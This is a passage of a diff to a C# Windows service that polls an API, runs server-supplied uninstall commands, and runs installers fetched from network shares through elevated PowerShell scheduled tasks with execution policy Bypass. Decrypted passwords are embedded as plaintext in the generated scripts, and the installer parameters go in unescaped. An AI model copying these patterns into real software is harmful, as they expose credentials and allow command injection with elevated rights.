@@ -9,6 +9,7 @@ using System.Management.Automation;
 using System.Net.Http.Json;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
+using System.Runtime.ExceptionServices;
 using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
 using System.Security.Cryptography;
@@ -129,174 +130,345 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
         #endregion
 
         #region Task That Will Run
+        //protected override async Task ExecuteAsync(CancellationToken stoppingToken)
+        //{
+        //    _logger.LogInformation("System Monitoring Service started.");
+
+        //    var lastSystemInfoSent = DateTime.MinValue;  // Track the last time system info was sent
+        //    var heartbeatInterval = TimeSpan.FromMinutes(5);
+        //    var systemInfoInterval = TimeSpan.FromMinutes(30);// Send system info once a day
+        //    //await SendHeartbeatToApi();
+
+        //    //await Task.Delay(100000);
+        //    while (!stoppingToken.IsCancellationRequested)
+        //    {
+        //        try
+        //        {
+        //            var currentTime = DateTime.Now;
+
+        //            // Send system information once a day
+        //            if (currentTime - lastSystemInfoSent >= systemInfoInterval)
+        //            {
+        //                var hostname = Environment.MachineName;
+        //                try
+        //                {
+        //                    #region uninstalltion
+        //                    var uninstalltions = await FetchUninstalltionFromApi(hostname);
+        //                    string username = "";
+        //                    string password = "";
+        //                    string fileName = $@"{workingDirectory}\uninstall.bat";
+
+        //                    if (File.Exists(fileName))
+        //                        File.Delete(fileName);
+
+        //                    if (uninstalltions.Any())
+        //                    {
+        //                        try
+        //                        {
+        //                            foreach (var uninstallation in uninstalltions)
+        //                            {
+        //                                _logger.LogInformation($"Uninstallation is present {uninstallation.softwareName}");
+        //                                string command = "";
+        //                                if (uninstallation.UninstallString.Contains("MsiExec.exe"))
+        //                                {
+        //                                    command += $"START /WAIT {uninstallation.UninstallString.Replace("/X{", "/X {")} /quiet /norestart {Environment.NewLine}";
+        //                                }
+        //                                else
+        //                                {
+        //                                    command += $"{uninstallation.UninstallString} {Environment.NewLine}";
+        //                                }
+
+        //                                File.AppendAllText(fileName, command);
+        //                                if (string.IsNullOrEmpty(username))
+        //                                {
+        //                                    username = uninstallation.Username;
+        //                                    password = uninstallation.Password;
+        //                                }
+        //                            }
+        //                        }
+        //                        catch (Exception ex)
+        //                        {
+        //                            _logger.LogInformation(ex.Message);
+        //                        }
+        //                        finally
+        //                        {
+
+        //                            if (File.Exists(fileName))
+        //                            {
+
+        //                                _logger.LogInformation("File created successfully.");
+        //                                await RunUninstallationScript(fileName, username, password);
+        //                            }
+        //                            else
+        //                            {
+        //                                throw new Exception("Unable to create a file");
+        //                            }
+
+        //                        }
+
+        //                    }
+        //                    #endregion
+        //                }
+        //                catch (Exception ex)
+        //                {
+        //                    _logger.LogInformation(ex.Message);
+        //                }
+        //                try
+        //                {
+
+        //                    #region Installation
+        //                    var updates = await FetchUpdatesFromApi(hostname);
+        //                    if (updates != null)
+        //                    {
+        //                        if (updates.Any())
+        //                        {
+        //                            foreach (var update in updates)
+        //                            {
+        //                                try
+        //                                {
+        //                                    _logger.LogInformation($"Processing update: {update.FilePath}");
+
+        //                                    // Copy the file to the target system
+        //                                    if (!Directory.Exists(workingDirectory))
+        //                                    {
+        //                                        Directory.CreateDirectory(workingDirectory);
+        //                                    }
+        //                                    else
+        //                                    {
+        //                                        try
+        //                                        {
+        //                                            Directory.Delete(workingDirectory);
+        //                                            Directory.CreateDirectory(workingDirectory);
+        //                                        }
+        //                                        catch { }
+        //                                    }
+        //                                    var localPath = workingDirectory + @"\" + Path.GetFileName(update.FilePath);
+        //                                    await CopyFileFromUNC(update.FilePath, localPath);
+        //                                    _logger.LogInformation("File copied successfully.");
+        //                                    // Run the installation
+        //                                    if (Path.GetExtension(localPath) != ".zip")
+        //                                    {
+        //                                        await RunInstallationScript(localPath, update.Parameters, update.Username, update.Password);
+        //                                    }
+        //                                    else
+        //                                    {
+        //                                        await RunInstallationScript(localPath, update.FileName, update.Parameters, update.Username, update.Password);
+        //                                    }
+
+        //                                    // Report success to the API
+        //                                    await ReportUpdateStatusToApi(update.UpdateID, "Completed", update.SystemID, "Successfully Installed");
+        //                                    _logger.LogInformation("Installation completed successfully.");
+        //                                }
+        //                                catch (Exception ex)
+        //                                {
+        //                                    _logger.LogError(ex, $"Error processing update: {ex.Message}");
+        //                                    await ReportUpdateStatusToApi(update.UpdateID, "Failed", update.SystemID, ex.Message);
+        //                                }
+        //                                break;
+        //                            }
+        //                        }
+        //                    }
+
+        //                    // Wait for the next interval
+        //                    //await Task.Delay(TimeSpan.FromMinutes(10), stoppingToken);
+
+        //                    #endregion
+
+
+        //                }
+        //                catch (Exception ex)
+        //                {
+        //                    _logger.LogInformation(ex.Message);
+        //                }
+        //                _logger.LogInformation("Sending system information to API...");
+        //                try
+        //                {
+        //                    var systemInfo = CollectSystemInformation();
+        //                    await SendSystemInformationToApi(systemInfo);
+        //                    lastSystemInfoSent = currentTime;  // Update the last sent time
+        //                    _logger.LogInformation("System information sent successfully.");
+        //                }
+        //                catch (Exception ex)
+        //                {
+        //                    _logger.LogError(ex, "Error sending system information to API.");
+        //                }
+        //            }
+
+        //            // Send heartbeat every 30 seconds
+        //            _logger.LogInformation("Sending heartbeat to API...");
+        //            try
+        //            {
+        //                await SendHeartbeatToApi();
+        //                _logger.LogInformation("Heartbeat sent successfully.");
+        //            }
+        //            catch (Exception ex)
+        //            {
+        //                _logger.LogError(ex, "Error sending heartbeat to API.");
+        //            }
+
+        //            // Wait for the next heartbeat interval
+        //            await Task.Delay(heartbeatInterval, stoppingToken);
+        //        }
+        //        catch (TaskCanceledException)
+        //        {
+        //            // Graceful exit when the stoppingToken is canceled
+        //            _logger.LogInformation("Service stopping due to cancellation request.");
+        //        }
+        //        catch (Exception ex)
+        //        {
+        //            _logger.LogError(ex, "Error in system monitoring loop.");
+        //            await Task.Delay(TimeSpan.FromMinutes(5), stoppingToken);  // Retry after a delay
+        //        }
+        //    }
+
+        //    _logger.LogInformation("System Monitoring Service stopped.");
+        //}
+
         protected override async Task ExecuteAsync(CancellationToken stoppingToken)
         {
             _logger.LogInformation("System Monitoring Service started.");
 
-            var lastSystemInfoSent = DateTime.MinValue;  // Track the last time system info was sent
+            var lastSystemInfoSent = DateTime.MinValue;
             var heartbeatInterval = TimeSpan.FromMinutes(5);
-            var systemInfoInterval = TimeSpan.FromMinutes(30);// Send system info once a day
-            //await SendHeartbeatToApi();
+            var systemInfoInterval = TimeSpan.FromMinutes(30);
 
-            //await Task.Delay(100000);
             while (!stoppingToken.IsCancellationRequested)
             {
                 try
                 {
                     var currentTime = DateTime.Now;
 
-                    // Send system information once a day
                     if (currentTime - lastSystemInfoSent >= systemInfoInterval)
                     {
                         var hostname = Environment.MachineName;
+
+                        #region Uninstallation
+
                         try
                         {
-                            #region uninstalltion
-                            var uninstalltions = await FetchUninstalltionFromApi(hostname);
-                            string username = "";
-                            string password = "";
-                            string fileName = $@"{workingDirectory}\uninstall.bat";
+                            var uninstallations = await FetchUninstalltionFromApi(hostname);
+                            string username = "", password = "";
+                            string uninstallFile = Path.Combine(workingDirectory, "uninstall.bat");
 
-                            if (File.Exists(fileName))
-                                File.Delete(fileName);
+                            if (File.Exists(uninstallFile))
+                                File.Delete(uninstallFile);
 
-                            if (uninstalltions.Any())
+                            if (uninstallations.Any())
                             {
-                                try
+                                foreach (var item in uninstallations)
                                 {
-                                    foreach (var uninstallation in uninstalltions)
+                                    _logger.LogInformation($"Uninstallation is present: {item.softwareName}");
+                                    string command = item.UninstallString.Contains("MsiExec.exe")
+                                        ? $"START /WAIT {item.UninstallString.Replace("/X{", "/X {")} /quiet /norestart{Environment.NewLine}"
+                                        : $"{item.UninstallString}{Environment.NewLine}";
+
+                                    File.AppendAllText(uninstallFile, command);
+
+                                    if (string.IsNullOrEmpty(username))
                                     {
-                                        _logger.LogInformation($"Uninstallation is present {uninstallation.softwareName}");
-                                        string command = "";
-                                        if (uninstallation.UninstallString.Contains("MsiExec.exe"))
+                                        username = item.Username;
+                                        password = item.Password;
+                                    }
+                                }
+
+                                if (File.Exists(uninstallFile))
+                                {
+                                    _logger.LogInformation("Uninstallation script file created.");
+                                    await RunUninstallationScript(uninstallFile, username, password);
+                                }
+                                else
+                                {
+                                    throw new Exception("Uninstallation script file could not be created.");
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            _logger.LogError(ex, "Error during uninstallation process.");
+                        }
+
+                        #endregion
+
+                        #region Installation
+
+                        try
+                        {
+                            var updates = await FetchUpdatesFromApi(hostname);
+                            if (updates != null && updates.Any())
+                            {
+                                foreach (var update in updates)
+                                {
+                                    try
+                                    {
+                                        _logger.LogInformation($"Processing update: {update.FilePath}");
+
+                                        if (Directory.Exists(workingDirectory))
                                         {
-                                            command += $"START /WAIT {uninstallation.UninstallString.Replace("/X{", "/X {")} /quiet /norestart {Environment.NewLine}";
+                                            try
+                                            {
+                                                Directory.Delete(workingDirectory, true);
+                                            }
+                                            catch { /* Ignore delete errors */ }
+                                        }
+
+                                        Directory.CreateDirectory(workingDirectory);
+
+                                        var localPath = Path.Combine(workingDirectory, Path.GetFileName(update.FilePath));
+                                        await CopyFileFromUNC(update.FilePath, localPath);
+                                        _logger.LogInformation("File copied successfully.");
+
+                                        if (Path.GetExtension(localPath) == ".zip")
+                                        {
+                                            await RunInstallationScript(localPath, update.FileName, update.Parameters, update.Username, update.Password, update.isLocal);
                                         }
                                         else
                                         {
-                                            command += $"{uninstallation.UninstallString} {Environment.NewLine}";
+                                            await RunInstallationScript(localPath, update.Parameters, update.Username, update.Password, update.isLocal);
                                         }
 
-                                        File.AppendAllText(fileName, command);
-                                        if (string.IsNullOrEmpty(username))
-                                        {
-                                            username = uninstallation.Username;
-                                            password = uninstallation.Password;
-                                        }
+                                        await ReportUpdateStatusToApi(update.UpdateID, "Completed", update.SystemID, "Successfully Installed");
+                                        _logger.LogInformation("Installation completed successfully.");
                                     }
-                                }
-                                catch (Exception ex)
-                                {
-                                    _logger.LogInformation(ex.Message);
-                                }
-                                finally
-                                {
-
-                                    if (File.Exists(fileName))
+                                    catch (Exception ex)
                                     {
-
-                                        _logger.LogInformation("File created successfully.");
-                                        await RunUninstallationScript(fileName, username, password);
-                                    }
-                                    else
-                                    {
-                                        throw new Exception("Unable to create a file");
+                                        _logger.LogError(ex, $"Error processing update: {ex.Message}");
+                                        await ReportUpdateStatusToApi(update.UpdateID, "Failed", update.SystemID, ex.Message);
                                     }
 
+                                    break; // Process only the first update
                                 }
-
                             }
-                            #endregion
                         }
                         catch (Exception ex)
                         {
-                            _logger.LogInformation(ex.Message);
+                            _logger.LogError(ex, "Error fetching or processing updates.");
                         }
+
+                        #endregion
+
+                        #region System Info Reporting
+
                         try
                         {
-
-                            #region Installation
-                            var updates = await FetchUpdatesFromApi(hostname);
-                            if (updates != null)
-                            {
-                                if (updates.Any())
-                                {
-                                    foreach (var update in updates)
-                                    {
-                                        try
-                                        {
-                                            _logger.LogInformation($"Processing update: {update.FilePath}");
-
-                                            // Copy the file to the target system
-                                            if (!Directory.Exists(workingDirectory))
-                                            {
-                                                Directory.CreateDirectory(workingDirectory);
-                                            }
-                                            else
-                                            {
-                                                try
-                                                {
-                                                    Directory.Delete(workingDirectory);
-                                                    Directory.CreateDirectory(workingDirectory);
-                                                }
-                                                catch { }
-                                            }
-                                            var localPath = workingDirectory + @"\" + Path.GetFileName(update.FilePath);
-                                            await CopyFileFromUNC(update.FilePath, localPath);
-                                            _logger.LogInformation("File copied successfully.");
-                                            // Run the installation
-                                            if (Path.GetExtension(localPath) != ".zip")
-                                            {
-                                                await RunInstallationScript(localPath, update.Parameters, update.Username, update.Password);
-                                            }
-                                            else
-                                            {
-                                                await RunInstallationScript(localPath, update.FileName, update.Parameters, update.Username, update.Password);
-                                            }
-
-                                            // Report success to the API
-                                            await ReportUpdateStatusToApi(update.UpdateID, "Completed", update.SystemID, "Successfully Installed");
-                                            _logger.LogInformation("Installation completed successfully.");
-                                        }
-                                        catch (Exception ex)
-                                        {
-                                            _logger.LogError(ex, $"Error processing update: {ex.Message}");
-                                            await ReportUpdateStatusToApi(update.UpdateID, "Failed", update.SystemID, ex.Message);
-                                        }
-                                        break;
-                                    }
-                                }
-                            }
-
-                            // Wait for the next interval
-                            //await Task.Delay(TimeSpan.FromMinutes(10), stoppingToken);
-
-                            #endregion
-
-
-                        }
-                        catch (Exception ex)
-                        {
-                            _logger.LogInformation(ex.Message);
-                        }
-                        _logger.LogInformation("Sending system information to API...");
-                        try
-                        {
+                            _logger.LogInformation("Sending system information to API...");
                             var systemInfo = CollectSystemInformation();
                             await SendSystemInformationToApi(systemInfo);
-                            lastSystemInfoSent = currentTime;  // Update the last sent time
+                            lastSystemInfoSent = currentTime;
                             _logger.LogInformation("System information sent successfully.");
                         }
                         catch (Exception ex)
                         {
                             _logger.LogError(ex, "Error sending system information to API.");
                         }
+
+                        #endregion
                     }
 
-                    // Send heartbeat every 30 seconds
-                    _logger.LogInformation("Sending heartbeat to API...");
+                    #region Heartbeat
+
                     try
                     {
+                        _logger.LogInformation("Sending heartbeat to API...");
                         await SendHeartbeatToApi();
                         _logger.LogInformation("Heartbeat sent successfully.");
                     }
@@ -305,23 +477,25 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
                         _logger.LogError(ex, "Error sending heartbeat to API.");
                     }
 
-                    // Wait for the next heartbeat interval
+                    #endregion
+
                     await Task.Delay(heartbeatInterval, stoppingToken);
                 }
                 catch (TaskCanceledException)
                 {
-                    // Graceful exit when the stoppingToken is canceled
                     _logger.LogInformation("Service stopping due to cancellation request.");
                 }
                 catch (Exception ex)
                 {
                     _logger.LogError(ex, "Error in system monitoring loop.");
-                    await Task.Delay(TimeSpan.FromMinutes(5), stoppingToken);  // Retry after a delay
+                    await Task.Delay(TimeSpan.FromMinutes(5), stoppingToken);
                 }
             }
 
             _logger.LogInformation("System Monitoring Service stopped.");
         }
+
+
         #endregion
 
         #region Installation
@@ -381,6 +555,8 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
             public string Password { get; set; }
             [JsonProperty("FileName")]
             public string FileName { get; set; }
+            [JsonProperty("isLocal")]
+            public bool isLocal { get; set; }
         }
 
         public class UpdateStatusRequest
@@ -446,191 +622,248 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
         }
 
         #region Run Task
-        private async Task RunInstallationScript(string installerPath, string parameters, string username, string encryptedPassword)
+
+        #region OldCode
+        //        private async Task RunInstallationScript(string installerPath, string parameters, string username, string encryptedPassword)
+        //        {
+        //            if (string.IsNullOrWhiteSpace(installerPath))
+        //                throw new ArgumentException("Installer path cannot be null or empty", nameof(installerPath));
+        //            if (string.IsNullOrWhiteSpace(username))
+        //                throw new ArgumentException("Username cannot be null or empty", nameof(username));
+        //            if (string.IsNullOrWhiteSpace(encryptedPassword))
+        //                throw new ArgumentException("Encrypted password cannot be null or empty", nameof(encryptedPassword));
+
+        //            // Decrypt the password
+        //            var password = Decrypt(encryptedPassword, true);
+
+        //            // Escape special characters
+        //            installerPath = installerPath.Replace("'", "''");
+        //            parameters = parameters ?? string.Empty;
+        //            username = username.Replace("'", "''");
+        //            password = password.Replace("'", "''");
+
+        //            // Build PowerShell script
+        //            var psScript = $@"
+        //$env:PSModulePath += ';C:\Windows\System32\WindowsPowerShell\v1.0\Modules'
+        //Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+        //Import-Module ScheduledTasks
+
+        //# Task Name
+        //$taskName = 'SMM_TemporaryInstallationTask'
+
+        //# Check if the task exists
+        //if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{
+        //    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+        //    Start-Sleep -Seconds 5  # Small delay to ensure cleanup
+        //}}
+
+        //# Convert password to SecureString
+        //$securePassword = ConvertTo-SecureString '{password}' -AsPlainText -Force
+
+        //# Create a credential object
+        //$credential = New-Object System.Management.Automation.PSCredential('{username}', $securePassword)
+
+        //# Define the scheduled task action
+        //$action = New-ScheduledTaskAction -Execute '{installerPath}' -Argument '{parameters}'
+
+        //# Define the trigger (run immediately)
+        //$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
+
+        //# Define the principal with elevation
+        //$principal = New-ScheduledTaskPrincipal -UserId '{username}' -LogonType Password -RunLevel Highest
+
+        //# Register the scheduled task
+        //Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User '{username}' -Password '{password}'
+
+        //# Start the scheduled task
+        //Start-ScheduledTask -TaskName $taskName
+
+        //# Wait for 15 minutes (900 seconds)
+        //#Start-Sleep -Seconds 900
+        //#}}
+
+        //# Clean up the scheduled task
+        //#Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+        //";
+
+
+
+        //            // Run PowerShell script asynchronously
+        //            Console.WriteLine("Async Task Started");
+        //            await Task.Run(() => ExecutePowerShellScript(psScript));
+        //            Console.WriteLine("Async Task Stopped");
+        //        }
+
+
+        //        private async Task RunInstallationScript(string zipFilePath, string installerExeName, string parameters, string username, string encryptedPassword)
+        //        {
+        //            var password = Decrypt(encryptedPassword, true);
+
+        //            // Define the extraction path
+        //            string extractionPath = Path.Combine(workingDirectory + @"\", Path.GetFileNameWithoutExtension(zipFilePath));
+
+        //            // PowerShell script to unzip the file and run the installer
+        //            //            var psScript = $@"
+
+        //            //# Ensure the module is loaded (Optional: You can skip if not needed)
+        //            //$env:PSModulePath += ';C:\Windows\System32\WindowsPowerShell\v1.0\Modules';
+        //            //Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force;
+        //            //Import-Module ScheduledTasks;
+        //            //    Import-Module Microsoft.PowerShell.Archive;
+
+
+        //            //    # Unzip the file
+        //            //    Expand-Archive -Path '{zipFilePath}' -DestinationPath '{extractionPath}' -Force
+
+        //            //    # Get the path to the installer executable
+        //            //    $installerPath = '{Path.Combine(extractionPath, installerExeName)}'
+
+        //            //   # Convert password to SecureString
+        //            //$securePassword = ConvertTo-SecureString '{password}' -AsPlainText -Force
+
+        //            //# Create a credential object
+        //            //$credential = New-Object System.Management.Automation.PSCredential('{username}', $securePassword)
+
+        //            //# Define the scheduled task action
+        //            //$action = New-ScheduledTaskAction -Execute $installerPath -Argument '{parameters}'
+
+        //            //# Define the trigger (run immediately)
+        //            //$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
+
+        //            //# Define the principal with elevation
+        //            //$principal = New-ScheduledTaskPrincipal -UserId '{username}' -LogonType Password -RunLevel Highest
+
+        //            //# Register the scheduled task
+        //            //Register-ScheduledTask -TaskName 'TemporaryInstallationTask' -Action $action -Trigger $trigger -User '{username}' -Password '{password}'
+
+        //            //# Start the scheduled task
+        //            //Start-ScheduledTask -TaskName 'TemporaryInstallationTask'
+
+        //            //# Clean up the scheduled task after it runs
+        //            //Start-Sleep -Seconds 20
+        //            //Unregister-ScheduledTask -TaskName 'TemporaryInstallationTask' -Confirm:$false";
+
+        //            var psScript = $@"
+        //# Ensure the module is loaded (Optional: You can skip if not needed)
+        //$env:PSModulePath += ';C:\Windows\System32\WindowsPowerShell\v1.0\Modules';
+        //Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force;
+        //Import-Module ScheduledTasks;
+        //Import-Module Microsoft.PowerShell.Archive;
+
+        //# Task Name
+        //$taskName = 'SMM_TemporaryInstallationTask'
+
+        //# Unregister existing scheduled task if present
+        //if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{
+        //    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+        //    Start-Sleep -Seconds 5  # Small delay to ensure cleanup
+        //}}
+
+        //# Unzip the file
+        //Expand-Archive -Path '{zipFilePath}' -DestinationPath '{extractionPath}' -Force
+
+        //# Get the path to the installer executable
+        //$installerPath = '{Path.Combine(extractionPath, installerExeName)}'
+
+        //# Convert password to SecureString
+        //$securePassword = ConvertTo-SecureString '{password}' -AsPlainText -Force
+
+        //# Create a credential object
+        //$credential = New-Object System.Management.Automation.PSCredential('{username}', $securePassword)
+
+        //# Define the scheduled task action
+        //$action = New-ScheduledTaskAction -Execute $installerPath -Argument '{parameters}'
+
+        //# Define the trigger (run immediately)
+        //$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
+
+        //# Define the principal with elevation
+        //$principal = New-ScheduledTaskPrincipal -UserId '{username}' -LogonType Password -RunLevel Highest
+
+        //# Register the scheduled task
+        //Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User '{username}' -Password '{password}'
+
+        //# Start the scheduled task
+        //Start-ScheduledTask -TaskName $taskName
+
+        //# Wait for 15 minutes (900 seconds)
+        //#Start-Sleep -Seconds 900
+
+        //# Delete the installer and extracted files
+        //#if (Test-Path $installerPath) {{
+        //    #Remove-Item -Path $installerPath -Force
+        //#}}
+
+        //#if (Test-Path '{extractionPath}') {{
+        //   # Remove-Item -Path '{extractionPath}' -Recurse -Force
+        //#}}
+
+        //# Delete the ZIP file
+        //#if (Test-Path '{zipFilePath}') {{
+        //    #Remove-Item -Path '{zipFilePath}' -Force
+        //#}}
+
+        //# Clean up the scheduled task
+        //#Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+        //";
+
+
+        //            await Task.Run(() => ExecutePowerShellScript(psScript));
+        //        }
+
+        #endregion
+
+        private async Task RunInstallationScript(string installerPath, string parameters, string username, string encryptedPassword, bool isLocal)
         {
             if (string.IsNullOrWhiteSpace(installerPath))
-                throw new ArgumentException("Installer path cannot be null or empty", nameof(installerPath));
+            {
+                throw new ArgumentException("Installer path cannot be null or empty", "installerPath");
+            }
             if (string.IsNullOrWhiteSpace(username))
-                throw new ArgumentException("Username cannot be null or empty", nameof(username));
+            {
+                throw new ArgumentException("Username cannot be null or empty", "username");
+            }
             if (string.IsNullOrWhiteSpace(encryptedPassword))
-                throw new ArgumentException("Encrypted password cannot be null or empty", nameof(encryptedPassword));
-
-            // Decrypt the password
-            var password = Decrypt(encryptedPassword, true);
-
-            // Escape special characters
+            {
+                throw new ArgumentException("Encrypted password cannot be null or empty", "encryptedPassword");
+            }
+            string text = Decrypt(encryptedPassword, useHashing: true);
             installerPath = installerPath.Replace("'", "''");
             parameters = parameters ?? string.Empty;
             username = username.Replace("'", "''");
-            password = password.Replace("'", "''");
-
-            // Build PowerShell script
-            var psScript = $@"
-$env:PSModulePath += ';C:\Windows\System32\WindowsPowerShell\v1.0\Modules'
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
-Import-Module ScheduledTasks
-
-# Task Name
-$taskName = 'SMM_TemporaryInstallationTask'
-
-# Check if the task exists
-if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{
-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-    Start-Sleep -Seconds 5  # Small delay to ensure cleanup
-}}
-
-# Convert password to SecureString
-$securePassword = ConvertTo-SecureString '{password}' -AsPlainText -Force
-
-# Create a credential object
-$credential = New-Object System.Management.Automation.PSCredential('{username}', $securePassword)
-
-# Define the scheduled task action
-$action = New-ScheduledTaskAction -Execute '{installerPath}' -Argument '{parameters}'
-
-# Define the trigger (run immediately)
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
-
-# Define the principal with elevation
-$principal = New-ScheduledTaskPrincipal -UserId '{username}' -LogonType Password -RunLevel Highest
-
-# Register the scheduled task
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User '{username}' -Password '{password}'
-
-# Start the scheduled task
-Start-ScheduledTask -TaskName $taskName
-
-# Wait for 15 minutes (900 seconds)
-#Start-Sleep -Seconds 900
-#}}
-
-# Clean up the scheduled task
-#Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-";
-
-
-
-            // Run PowerShell script asynchronously
-            Console.WriteLine("Async Task Started");
-            await Task.Run(() => ExecutePowerShellScript(psScript));
-            Console.WriteLine("Async Task Stopped");
+            text = text.Replace("'", "''");
+            if (!isLocal)
+            {
+                string psScript = $"\r\n$env:PSModulePath += ';C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules'\r\nSet-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force\r\nImport-Module ScheduledTasks\r\n\r\n# Task Name\r\n$taskName = 'SMM_TemporaryInstallationTask'\r\n\r\n# Check if the task exists\r\nif (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{\r\n    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\r\n    Start-Sleep -Seconds 5  # Small delay to ensure cleanup\r\n}}\r\n\r\n# Convert password to SecureString\r\n$securePassword = ConvertTo-SecureString '{text}' -AsPlainText -Force\r\n\r\n# Create a credential object\r\n$credential = New-Object System.Management.Automation.PSCredential('{username}', $securePassword)\r\n\r\n# Define the scheduled task action\r\n$action = New-ScheduledTaskAction -Execute '{installerPath}' -Argument '{parameters}'\r\n\r\n# Define the trigger (run immediately)\r\n$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)\r\n\r\n# Define the principal with elevation\r\n$principal = New-ScheduledTaskPrincipal -UserId '{username}' -LogonType Password -RunLevel Highest\r\n\r\n# Register the scheduled task\r\nRegister-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User '{username}' -Password '{text}'\r\n\r\n# Start the scheduled task\r\nStart-ScheduledTask -TaskName $taskName\r\n\r\n# Wait for 15 minutes (900 seconds)\r\n#Start-Sleep -Seconds 900\r\n#}}\r\n\r\n# Clean up the scheduled task\r\n#Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\r\n";
+                Console.WriteLine("Async Task Started");
+                await Task.Run(() => ExecutePowerShellScript(psScript));
+                Console.WriteLine("Async Task Stopped");
+            }
+            else
+            {
+                string psScript2 = $"\r\n$env:PSModulePath += ';C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules'\r\nSet-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force\r\nImport-Module ScheduledTasks\r\n\r\n# Task Name\r\n$taskName = 'SMM_TemporaryInstallationTask'\r\n\r\n# Delete existing task if present\r\nif (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{\r\n    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false\r\n    Start-Sleep -Seconds 5\r\n}}\r\n\r\n# Define action (what to run)\r\n$action = New-ScheduledTaskAction -Execute '{installerPath}' -Argument '{parameters}'\r\n\r\n# Define trigger (when to run)\r\n$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(10))\r\n\r\n# Define principal (current user, no elevation)\r\n$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited\r\n\r\n# Define task settings\r\n$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\r\n\r\n# Create the scheduled task\r\nRegister-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings\r\n\r\n# Start the scheduled task\r\nStart-ScheduledTask -TaskName $taskName\r\n";
+                Console.WriteLine("Async Task Started");
+                await Task.Run(() => ExecutePowerShellScript(psScript2));
+                Console.WriteLine("Async Task Stopped");
+            }
         }
 
-
-        private async Task RunInstallationScript(string zipFilePath, string installerExeName, string parameters, string username, string encryptedPassword)
+        private async Task RunInstallationScript(string zipFilePath, string installerExeName, string parameters, string username, string encryptedPassword, bool isLocal)
         {
-            var password = Decrypt(encryptedPassword, true);
-
-            // Define the extraction path
-            string extractionPath = Path.Combine(workingDirectory + @"\", Path.GetFileNameWithoutExtension(zipFilePath));
-
-            // PowerShell script to unzip the file and run the installer
-            //            var psScript = $@"
-
-            //# Ensure the module is loaded (Optional: You can skip if not needed)
-            //$env:PSModulePath += ';C:\Windows\System32\WindowsPowerShell\v1.0\Modules';
-            //Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force;
-            //Import-Module ScheduledTasks;
-            //    Import-Module Microsoft.PowerShell.Archive;
-
-
-            //    # Unzip the file
-            //    Expand-Archive -Path '{zipFilePath}' -DestinationPath '{extractionPath}' -Force
-
-            //    # Get the path to the installer executable
-            //    $installerPath = '{Path.Combine(extractionPath, installerExeName)}'
-
-            //   # Convert password to SecureString
-            //$securePassword = ConvertTo-SecureString '{password}' -AsPlainText -Force
-
-            //# Create a credential object
-            //$credential = New-Object System.Management.Automation.PSCredential('{username}', $securePassword)
-
-            //# Define the scheduled task action
-            //$action = New-ScheduledTaskAction -Execute $installerPath -Argument '{parameters}'
-
-            //# Define the trigger (run immediately)
-            //$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
-
-            //# Define the principal with elevation
-            //$principal = New-ScheduledTaskPrincipal -UserId '{username}' -LogonType Password -RunLevel Highest
-
-            //# Register the scheduled task
-            //Register-ScheduledTask -TaskName 'TemporaryInstallationTask' -Action $action -Trigger $trigger -User '{username}' -Password '{password}'
-
-            //# Start the scheduled task
-            //Start-ScheduledTask -TaskName 'TemporaryInstallationTask'
-
-            //# Clean up the scheduled task after it runs
-            //Start-Sleep -Seconds 20
-            //Unregister-ScheduledTask -TaskName 'TemporaryInstallationTask' -Confirm:$false";
-
-            var psScript = $@"
-# Ensure the module is loaded (Optional: You can skip if not needed)
-$env:PSModulePath += ';C:\Windows\System32\WindowsPowerShell\v1.0\Modules';
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force;
-Import-Module ScheduledTasks;
-Import-Module Microsoft.PowerShell.Archive;
-
-# Task Name
-$taskName = 'SMM_TemporaryInstallationTask'
-
-# Unregister existing scheduled task if present
-if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {{
